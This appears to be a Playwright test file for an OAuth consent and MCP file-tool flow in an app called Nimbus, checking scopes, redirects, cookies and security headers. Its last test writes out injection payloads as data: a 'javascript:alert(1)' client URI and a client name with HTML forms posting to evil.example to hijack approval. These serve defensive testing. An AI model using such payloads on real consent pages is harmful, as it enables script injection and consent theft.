import { createHash, randomBytes, randomUUID } from "node:crypto";
import {
  createServer,
  type IncomingMessage,
  type ServerResponse,
} from "node:http";
import {
  Client,
  StreamableHTTPClientTransport,
  UnauthorizedError,
  type OAuthClientProvider,
  type OAuthDiscoveryState,
  type StoredOAuthClientInformation,
  type StoredOAuthTokens,
} from "@modelcontextprotocol/client";
import { expect, type APIRequestContext, type Page } from "@playwright/test";
import { z } from "zod";
import { adminEmail, client, origin, password, test } from "./helpers";

/** An HTTP server on a free loopback port. */
async function listen(
  handle: (request: IncomingMessage, response: ServerResponse) => void,
) {
  const server = createServer(handle);
  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
  const address = server.address();
  if (address === null || typeof address === "string")
    throw new Error("The test server has no port.");
  return {
    port: address.port,
    close: () => new Promise<void>((resolve) => server.close(() => resolve())),
  };
}

type Callback = { url: URL; cookies: string };

/**
 * A hosted client's callback, as Executor's works: it answers the authorization response with a
 * redirect onward to a third origin (its sign-in or app host). It also starts a client session
 * whose cookies show what reaches the callback after the consent page.
 */
async function forwardingCallback(host = "127.0.0.1") {
  const landing = await listen((_request, response) => {
    response.end("Signed in to the client.");
  });
  const received: Callback[] = [];
  const client = await listen((request, response) => {
    const url = new URL(request.url ?? "/", `http://${host}`);
    if (url.pathname === "/session") {
      response.setHeader("Set-Cookie", [
        "lax_session=1; Path=/; SameSite=Lax",
        "strict_session=1; Path=/; SameSite=Strict",
      ]);
      response.end("Client session started.");
      return;
    }
    received.push({ url, cookies: request.headers.cookie ?? "" });
    response.writeHead(302, {
      Location: `http://127.0.0.1:${landing.port}/signed-in`,
    });
    response.end();
  });
  return {
    origin: `http://${host}:${client.port}`,
    redirectUri: `http://${host}:${client.port}/callback`,
    landing: `http://127.0.0.1:${landing.port}/signed-in`,
    received,
    close: async () => {
      await client.close();
      await landing.close();
    },
  };
}

/** A state value with characters that must reach the client unchanged. */
const trickyState = `s t&a=t'e"<x>;,#${randomUUID()}`;

/** Register a public client for `redirectUri` and return an authorization URL for it. */
async function authorizationRequest(
  request: APIRequestContext,
  name: string,
  redirectUri: string,
) {
  const registered = await request.post(`${origin}/oauth/register`, {
    data: {
      client_name: name,
      redirect_uris: [redirectUri],
      grant_types: ["authorization_code", "refresh_token"],
      response_types: ["code"],
      token_endpoint_auth_method: "none",
    },
  });
  expect(registered.status()).toBe(201);
  const clientId = z
    .object({ client_id: z.string() })
    .parse(await registered.json()).client_id;
  const verifier = randomBytes(32).toString("base64url");
  const url = new URL(`${origin}/oauth/authorize`);
  url.search = new URLSearchParams({
    response_type: "code",
    client_id: clientId,
    redirect_uri: redirectUri,
    code_challenge: createHash("sha256").update(verifier).digest("base64url"),
    code_challenge_method: "S256",
    state: trickyState,
  }).toString();
  const exchange = (code: string) =>
    request.post(`${origin}/oauth/token`, {
      form: {
        grant_type: "authorization_code",
        client_id: clientId,
        code,
        redirect_uri: redirectUri,
        code_verifier: verifier,
      },
    });
  return { url: url.href, exchange };
}

/** A loopback redirect listener, as CLI clients run during authorization (RFC 8252). */
async function loopbackCallback() {
  let receive: (url: URL) => void = () => {};
  const received = new Promise<URL>((resolve) => (receive = resolve));
  const server = await listen((request, response) => {
    receive(new URL(request.url ?? "/", "http://127.0.0.1"));
    response.end("Connected. You can close this window.");
  });
  return {
    redirectUri: `http://127.0.0.1:${server.port}/callback`,
    received,
    close: server.close,
  };
}

/** An MCP client's OAuth state, kept in memory, as a CLI would keep it on disk. */
class TestAuthProvider implements OAuthClientProvider {
  authorizationUrl: URL | undefined;
  private information: StoredOAuthClientInformation | undefined;
  private stored: StoredOAuthTokens | undefined;
  private verifier = "";
  private discovery: OAuthDiscoveryState | undefined;
  constructor(
    private readonly name: string,
    private readonly redirectUri: string,
  ) {}
  get redirectUrl() {
    return this.redirectUri;
  }
  get clientMetadata() {
    return {
      client_name: this.name,
      redirect_uris: [this.redirectUri],
      grant_types: ["authorization_code", "refresh_token"],
      response_types: ["code"],
      token_endpoint_auth_method: "none",
    };
  }
  clientInformation() {
    return this.information;
  }
  saveClientInformation(information: StoredOAuthClientInformation) {
    this.information = information;
  }
  tokens() {
    return this.stored;
  }
  saveTokens(tokens: StoredOAuthTokens) {
    this.stored = tokens;
  }
  redirectToAuthorization(url: URL) {
    this.authorizationUrl = url;
  }
  saveCodeVerifier(verifier: string) {
    this.verifier = verifier;
  }
  codeVerifier() {
    return this.verifier;
  }
  saveDiscoveryState(state: OAuthDiscoveryState) {
    this.discovery = state;
  }
  discoveryState() {
    return this.discovery;
  }
}

const endpoint = () => new URL(`${origin}/api/mcp`);

/** Run discovery and registration, approve in the browser, and return a connected client. */
async function connect(
  page: Page,
  name: string,
  approve: (page: Page) => Promise<void>,
) {
  const callback = await loopbackCallback();
  try {
    const auth = new TestAuthProvider(name, callback.redirectUri);
    const first = new StreamableHTTPClientTransport(endpoint(), {
      authProvider: auth,
    });
    await expect(
      new Client({ name, version: "1.0.0" }).connect(first),
    ).rejects.toBeInstanceOf(UnauthorizedError);
    const authorizationUrl = auth.authorizationUrl;
    if (!authorizationUrl)
      throw new Error("The client was not sent to Nimbus to authorize.");
    expect(authorizationUrl.origin).toBe(origin);
    await page.goto(authorizationUrl.href);
    await approve(page);
    const returned = await callback.received;
    expect(returned.searchParams.get("iss")).toBe(origin);
    await expect(
      page.getByText("Connected. You can close this window."),
    ).toBeVisible();
    await first.finishAuth(returned.searchParams);
    const client = new Client({ name, version: "1.0.0" });
    await client.connect(
      new StreamableHTTPClientTransport(endpoint(), { authProvider: auth }),
    );
    return client;
  } finally {
    await callback.close();
  }
}

const consent = (page: Page) =>
  page.getByRole("button", { name: "Connect", exact: true });

const structured = (result: unknown) =>
  z
    .object({ structuredContent: z.record(z.string(), z.unknown()) })
    .parse(result).structuredContent;
const errorText = (result: unknown) => {
  const parsed = z
    .object({
      isError: z.literal(true),
      content: z.array(z.object({ text: z.string() })),
    })
    .parse(result);
  return parsed.content.map((item) => item.text).join("\n");
};

test("an MCP client connects through OAuth, works with files, and is cut off when disconnected", async ({
  page,
  isMobile,
}) => {
  test.skip(
    isMobile,
    "Protocol flow; the consent and settings layouts are exercised on desktop.",
  );
  const name = `E2E agent ${randomUUID().slice(0, 8)}`;
  const client = await connect(page, name, async (current) => {
    await expect(
      current.getByRole("heading", { name: `Connect ${name}?` }),
    ).toBeVisible();
    await expect(current.getByText(adminEmail)).toBeVisible();
    await consent(current).click();
  });

  const tools = (await client.listTools()).tools;
  expect(tools.map((tool) => tool.name)).toEqual(
    expect.arrayContaining(["list_folder", "write_text", "create_public_link"]),
  );
  expect(
    tools.find((tool) => tool.name === "list_folder")?.annotations,
  ).toMatchObject({ readOnlyHint: true });
  expect(
    tools.find((tool) => tool.name === "move_to_trash")?.annotations,
  ).toMatchObject({ destructiveHint: true });

  const root = structured(
    await client.callTool({ name: "list_folder", arguments: { path: "" } }),
  );
  expect(JSON.stringify(root)).toContain("alpha.txt");
  expect(JSON.stringify(root)).not.toContain(".nimbus");

  const file = `mcp-${randomUUID()}.txt`;
  expect(
    structured(
      await client.callTool({
        name: "write_text",
        arguments: { path: file, content: "written by an agent" },
      }),
    ),
  ).toMatchObject({ outcome: "created" });
  expect(
    errorText(
      await client.callTool({
        name: "write_text",
        arguments: { path: file, content: "again" },
      }),
    ),
  ).toContain("already exists");
  expect(
    structured(
      await client.callTool({ name: "read_text", arguments: { path: file } }),
    ),
  ).toMatchObject({ content: { kind: "text", text: "written by an agent" } });

  const link = z.object({ url: z.string() }).parse(
    structured(
      await client.callTool({
        name: "get_download_link",
        arguments: { path: file },
      }),
    ),
  );
  const download = await page.request.get(link.url);
  expect(download.status()).toBe(200);
  expect(await download.text()).toBe("written by an agent");

  await page.goto("/settings/mcp");
  await expect(
    page.getByRole("textbox", { name: "Server address", exact: true }),
  ).toHaveValue(`${origin}/api/mcp`);
  const row = page.getByRole("listitem").filter({ hasText: name });
  await expect(row).toContainText("Last used");
  await row.getByRole("button", { name: "Disconnect", exact: true }).click();
  const dialog = page.getByRole("alertdialog");
  await dialog.getByRole("button", { name: "Disconnect", exact: true }).click();
  // The open dialog hides the list from the accessibility tree, so wait for it to close first.
  await expect(dialog).toBeHidden();
  await expect(
    page.getByRole("listitem").filter({ hasText: name }),
  ).toHaveCount(0);

  expect((await page.request.get(link.url)).status()).toBe(403);
  await expect(
    client.callTool({ name: "list_folder", arguments: { path: "" } }),
  ).rejects.toThrow();
});

test("a signed-out user signs in, then connects a client with view access only", async ({
  browser,
  isMobile,
}) => {
  test.skip(isMobile, "Protocol flow; covered on desktop.");
  const context = await browser.newContext({
    storageState: { cookies: [], origins: [] },
  });
  const page = await context.newPage();
  const client = await connect(
    page,
    `Viewer ${randomUUID().slice(0, 8)}`,
    async (current) => {
      await expect(current).toHaveURL(/\/login\?callbackURL=/);
      await current.getByLabel("Email", { exact: true }).fill(adminEmail);
      await current.getByLabel("Password", { exact: true }).fill(password);
      await current
        .getByRole("button", { name: "Sign in", exact: true })
        .click();
      await expect(consent(current)).toBeVisible();
      await current
        .getByRole("checkbox", { name: /Change your files/ })
        .uncheck();
      await current.getByRole("checkbox", { name: /Manage sharing/ }).uncheck();
      await consent(current).click();
    },
  );
  expect(
    structured(
      await client.callTool({
        name: "list_folder",
        arguments: { path: "docs" },
      }),
    ),
  ).toMatchObject({ entries: [{ name: "readme.md" }] });
  // Nimbus answers 403 insufficient_scope; the SDK then asks the user to authorize again.
  await expect(
    client.callTool({
      name: "move_to_trash",
      arguments: { path: "alpha.txt" },
    }),
  ).rejects.toBeInstanceOf(UnauthorizedError);
  expect(
    JSON.stringify(
      structured(
        await client.callTool({ name: "list_folder", arguments: { path: "" } }),
      ),
    ),
  ).toContain("alpha.txt");
  await context.close();
});

const cookieNames = (cookies: string) =>
  cookies
    .split(";")
    .map((cookie) => cookie.split("=")[0]?.trim() ?? "")
    .filter(Boolean)
    .sort();

test("approving returns to a client whose callback redirects to another origin", async ({
  browser,
  isMobile,
}) => {
  test.skip(isMobile, "Protocol flow; covered on desktop.");
  const callback = await forwardingCallback();
  const context = await browser.newContext({
    storageState: { cookies: [], origins: [] },
  });
  const page = await context.newPage();
  try {
    const authorization = await authorizationRequest(
      context.request,
      `Hosted ${randomUUID().slice(0, 8)}`,
      callback.redirectUri,
    );
    await page.goto(`${callback.origin}/session`);
    await page.goto(authorization.url);
    await page.getByLabel("Email", { exact: true }).fill(adminEmail);
    await page.getByLabel("Password", { exact: true }).fill(password);
    await page.getByRole("button", { name: "Sign in", exact: true }).click();
    await consent(page).click();
    await expect(page).toHaveURL(callback.landing);
    await expect(page.getByText("Signed in to the client.")).toBeVisible();

    expect(callback.received).toHaveLength(1);
    const [returned] = callback.received;
    if (!returned) throw new Error("The client callback was not reached.");
    expect(returned.url.searchParams.get("iss")).toBe(origin);
    expect(returned.url.searchParams.get("state")).toBe(trickyState);
    // A top-level navigation from another site carries the client's Lax cookie, not its Strict one.
    expect(cookieNames(returned.cookies)).toEqual(["lax_session"]);
    const code = returned.url.searchParams.get("code") ?? "";
    expect((await authorization.exchange(code)).status()).toBe(200);

    // Back returns to the consent page, not to a resubmission of the approval.
    await page.goBack();
    await expect(page).toHaveURL(/\/oauth\/consent\?/);
    expect(callback.received).toHaveLength(1);
  } finally {
    await context.close();
    await callback.close();
  }
});

test("cancelling returns to a client whose callback redirects to another origin", async ({
  page,
  isMobile,
}) => {
  test.skip(isMobile, "Protocol flow; covered on desktop.");
  const callback = await forwardingCallback();
  try {
    const authorization = await authorizationRequest(
      page.request,
      `Hosted ${randomUUID().slice(0, 8)}`,
      callback.redirectUri,
    );
    await page.goto(authorization.url);
    await page.getByRole("button", { name: "Cancel", exact: true }).click();
    await expect(page).toHaveURL(callback.landing);
    expect(callback.received).toHaveLength(1);
    const [returned] = callback.received;
    if (!returned) throw new Error("The client callback was not reached.");
    expect(returned.url.searchParams.get("error")).toBe("access_denied");
    expect(returned.url.searchParams.get("code")).toBeNull();
    expect(returned.url.searchParams.get("iss")).toBe(origin);
    expect(returned.url.searchParams.get("state")).toBe(trickyState);
  } finally {
    await callback.close();
  }
});

test("approving returns to a localhost callback with JavaScript disabled", async ({
  browser,
  isMobile,
}) => {
  test.skip(isMobile, "Protocol flow; covered on desktop.");
  const callback = await forwardingCallback("localhost");
  const context = await browser.newContext({
    storageState: "test-results/.auth/admin.json",
    javaScriptEnabled: false,
  });
  const page = await context.newPage();
  try {
    const authorization = await authorizationRequest(
      context.request,
      `CLI ${randomUUID().slice(0, 8)}`,
      callback.redirectUri,
    );
    await page.goto(authorization.url);
    await consent(page).click();
    await expect(page).toHaveURL(callback.landing);
    const [returned] = callback.received;
    if (!returned) throw new Error("The client callback was not reached.");
    expect(returned.url.searchParams.get("state")).toBe(trickyState);
    const code = returned.url.searchParams.get("code") ?? "";
    expect((await authorization.exchange(code)).status()).toBe(200);
  } finally {
    await context.close();
    await callback.close();
  }
});

const formAction = (policy: string) =>
  policy
    .split(";")
    .map((directive) => directive.trim())
    .find((directive) => directive.startsWith("form-action"));

test("only the consent form may follow a client's redirects; other pages keep form-action 'self'", async ({
  page,
  browser,
  isMobile,
}) => {
  test.skip(isMobile, "Response headers; covered on desktop.");
  const policyOf = async (request: APIRequestContext, path: string) => {
    const response = await request.get(path);
    expect(response.status(), path).toBeLessThan(500);
    return response.headers()["content-security-policy"] ?? "";
  };
  const authorization = await authorizationRequest(
    page.request,
    `Policy ${randomUUID().slice(0, 8)}`,
    "http://127.0.0.1:43123/callback",
  );
  const consentPolicy = await policyOf(page.request, authorization.url);
  expect(formAction(consentPolicy)).toBeUndefined();
  for (const directive of [
    "default-src 'self'",
    "script-src-attr 'none'",
    "object-src 'none'",
    "base-uri 'none'",
    "frame-ancestors 'none'",
  ])
    expect(consentPolicy).toContain(directive);
  expect(consentPolicy).toMatch(
    /script-src 'self' 'nonce-[A-Za-z0-9+/=]+' 'strict-dynamic'/,
  );

  const share = await (
    await client(page.context())
  ).shares.create.mutate({
    path: "alpha.txt",
    expiresAt: null,
    maxDownloads: null,
  });
  const visitor = await browser.newContext({
    storageState: { cookies: [], origins: [] },
  });
  try {
    for (const [request, path] of [
      [visitor.request, "/login"],
      [page.request, "/"],
      [visitor.request, `/s/${share.token}`],
      // An invalid request shows an error with no form to submit.
      [page.request, "/oauth/consent?client_id=no-such-client"],
    ] as const)
      expect(formAction(await policyOf(request, path)), path).toBe(
        "form-action 'self'",
      );
  } finally {
    await visitor.close();
  }
});

test("registration data shown on the consent page never becomes markup", async ({
  page,
  isMobile,
}) => {
  test.skip(isMobile, "Protocol flow; covered on desktop.");
  const scriptUri = await page.request.post(`${origin}/oauth/register`, {
    data: {
      client_name: "Script link",
      redirect_uris: ["http://127.0.0.1:43123/callback"],
      client_uri: "javascript:alert(1)",
    },
  });
  expect(scriptUri.status()).toBe(400);

  const name = `<form action="https://evil.example/a"><button formaction="https://evil.example/b">Steal</button></form>"><input name="decision" value="approve">${randomUUID().slice(0, 8)}`;
  const authorization = await authorizationRequest(
    page.request,
    name,
    "http://127.0.0.1:43123/callback",
  );
  await page.goto(authorization.url);
  await expect(
    page.getByRole("heading", { name: `Connect ${name}?` }),
  ).toBeVisible();
  await expect(page.locator("form")).toHaveCount(1);
  await expect(page.locator("form")).toHaveAttribute(
    "action",
    "/oauth/consent/decision",
  );
  await expect(page.locator("[formaction]")).toHaveCount(0);
  await expect(page.locator('input[name="decision"]')).toHaveCount(0);
  await expect(page.getByRole("button", { name: "Steal" })).toHaveCount(0);
});
